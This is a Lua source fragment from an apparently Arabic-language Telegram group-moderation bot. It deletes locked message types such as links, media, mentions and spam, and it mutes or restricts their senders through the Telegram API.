if msg.content_.ID == 'MessageSticker' then   if tahadevstorm:get(DEVSTOR..'lockktm:ste'..msg.chat_id_) and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then       if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الملصقات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)     return  end  end end
if msg.forward_info_ and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockktm:fwd'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف التوجيهات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)     return  end end  end 
if msg.content_.ID == 'MessageDocument' and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockktm:file'..msg.chat_id_) then      if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الملفات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)     return  end end  end 
if msg.content_.ID == "MessageUnsupported" and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockktm:self'..msg.chat_id_) then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الفيديو كام  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)     return  end end  end 
if msg.content_.entities_ then if msg.content_.entities_[0] then if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then   if tahadevstorm:get(DEVSTOR..'lockktm:mark'..msg.chat_id_) and not is_vipgroup(msg) and not is_vipgroups(msg) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الماركداون  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)            end      end end end end
if msg.content_.ID == 'MessageContact' and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lockktm:phon'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الجهات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)    end      end end
if msg.content_.text_ then    local _nl, ctrl_chars = string.gsub(text, '%c', '')    local _nl, real_digits = string.gsub(text, '%d', '')     local hash = 'bot:sens:spam'..msg.chat_id_    if not tahadevstorm:get(DEVSTOR..hash) then   sens = 400    else   sens = tonumber(tahadevstorm:get(DEVSTOR..hash))    end   if not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) and tahadevstorm:get(DEVSTOR..'lockktm:spm'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then   delete_msg(msg.chat_id_,{[0] = msg.id_})         tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)      end  end
-->>lock by tkeed chat <<--
if text and text:match("@") and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then   if tahadevstorm:get(DEVSTOR..'lockked:user'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف المعرفات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)     end      end end
if text and text:match("#") and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then   if tahadevstorm:get(DEVSTOR..'lockked:hash'..msg.chat_id_) then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الهاشتاك  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else    delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)     end   end   end
if text and text:match("/") and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then   if tahadevstorm:get(DEVSTOR..'lockked:cmds'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الشارحه  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR.."keed:", msg.chat_id_)   end end      end
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lockked:links'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الروابط  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)      end    end   end   
if msg.content_.ID == 'MessagePhoto' and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lockked:photo'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الصور  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)     delete_msg(msg.chat_id_,{[0] = msg.id_})      HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."")   return  end end  end 
if msg.content_.ID == 'MessageText' and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockked:text'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الرسائل  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)     return  end end  end 
if msg.content_.ID == 'MessageVideo' and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockked:ved'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الفيديو  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)     return  end end  end 
if msg.content_.ID == 'MessageAnimation' and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockked:gif'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف المتحركه  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)     return  end end  end 
if msg.content_.game_ and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockked:geam'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الالعاب  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)      return  end end  end 
if msg.content_.ID == 'MessageAudio' and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockked:muse'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الاغاني  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)      return  end end  end 
if msg.content_.ID == 'MessageVoice' and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockked:vico'..msg.chat_id_) then       if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الصوت  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)     return  end end  end
if msg.reply_markup_ and msg.reply_markup_.ID == 'ReplyMarkupInlineKeyboard' and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockked:inlin'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الاونلاين  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)     return  end end  end 
if msg.content_.ID == 'MessageSticker' and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockked:ste'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الملصقات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)     return  end end end 
if msg.forward_info_ and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockked:fwd'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف التوجيهات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)     return  end end  end 
if msg.content_.ID == 'MessageDocument' and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockked:file'..msg.chat_id_) then      if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الملفات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)     return  end end  end 
if msg.content_.ID == "MessageUnsupported" and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockked:self'..msg.chat_id_) then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الفيديو كام  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)     return  end end  end 
if msg.content_.entities_ then if msg.content_.entities_[0] then if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then   if tahadevstorm:get(DEVSTOR..'lockked:mark'..msg.chat_id_) and not is_vipgroup(msg) and not is_vipgroups(msg) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الماركداون  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)       end      end end end end
if msg.content_.ID == 'MessageContact' and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockked:phon'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الجهات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)      end    end  end
if msg.content_.text_ then    local _nl, ctrl_chars = string.gsub(text, '%c', '')    local _nl, real_digits = string.gsub(text, '%d', '')     local hash = 'bot:sens:spam'..msg.chat_id_    if not tahadevstorm:get(DEVSTOR..hash) then   sens = 400    else   sens = tonumber(tahadevstorm:get(DEVSTOR..hash))    end   if not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) and tahadevstorm:get(DEVSTOR..'lockked:spm'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then   delete_msg(msg.chat_id_,{[0] = msg.id_})         HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)     end  end
if msg.content_.ID == "MessageChatAddMembers" then     if msg.content_.members_[0].type_.ID == 'UserTypeBot' then   if tahadevstorm:get(DEVSTOR..'lockked:bots'..msg.chat_id_) and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then        if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع طرد البوتات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الطرد او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, 'Kicked')      HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,msg.sender_user_id_)     end   end   end    end  
-->>lock by del user chat <<--
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then    if tonumber(tahadevstorm:get('numlocktgser'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الاشعارات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         end      end    end  
if msg.content_.ID == 'MessagePinMessage' then    if tonumber(tahadevstorm:get('numlockpinmsg'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then    unpinChannelMessage(msg.chat_id_)   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ تم وضع القييود عليك لا تستطيع التثبيت *🍃\n", 1, "md")    else local PinnedMessage = tahadevstorm:get(DEVSTOR..'pinned'..msg.chat_id_) pinChannelMessage(msg.chat_id_,tonumber(PinnedMessage), 0) end   end
if msg.content_.caption_ and not is_monsh(msg)  then  if msg.content_.caption_:match("@") then  if tonumber(tahadevstorm:get('numlockuserneam'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then  delete_msg(msg.chat_id_,{[0] = msg.id_})  end  end  end
if text and text:match("@") and not is_monsh(msg)  then   if tonumber(tahadevstorm:get('numlockuserneam'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف المعرفات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})          end    end      end
if msg.content_.caption_ and not is_monsh(msg)  then if tonumber(tahadevstorm:get('numlockhash'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if msg.content_.caption_:match("#") then delete_msg(msg.chat_id_,{[0] = msg.id_}) end  end  end
if text and text:match("#") and not is_monsh(msg)  then   if tonumber(tahadevstorm:get('numlockhash'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الهاشتاك  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})          end      end    end
if msg.content_.caption_ then if not is_monsh(msg)  then if tonumber(tahadevstorm:get('numlocklinks'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.content_.caption_:match(".[Pp][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or msg.content_.caption_:match("[Tt].[Mm][Ee]/") then delete_msg(msg.chat_id_,{[0] = msg.id_}) end  end  end end
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") and not is_monsh(msg)  then   if tonumber(tahadevstorm:get('numlocklinks'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الروابط  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         end   end      end    